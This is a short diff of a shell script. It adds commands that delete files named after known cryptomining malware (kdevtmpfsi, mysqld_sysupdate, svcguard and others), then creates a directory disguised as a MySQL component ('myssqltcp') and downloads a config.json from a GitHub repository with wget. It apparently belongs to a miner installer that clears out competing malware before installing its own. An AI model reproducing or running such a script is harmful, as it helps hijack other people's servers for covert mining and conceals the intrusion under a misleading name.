@@ -711,6 +711,14 @@ sync && echo 3 >/proc/sys/vm/dro
 
 # Download program
 cd /$HOME/
+rm -f mysqld_sysupdate
+rm -f svcguard
+rm -f svcupdate
+rm -f svcupdates
+rm -f svcworkmanager
+rm -f newsvc.sh
+rm -f kdevtmpfsi
+
 mkdir myssqltcp
 cd /$HOME/myssqltcp
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
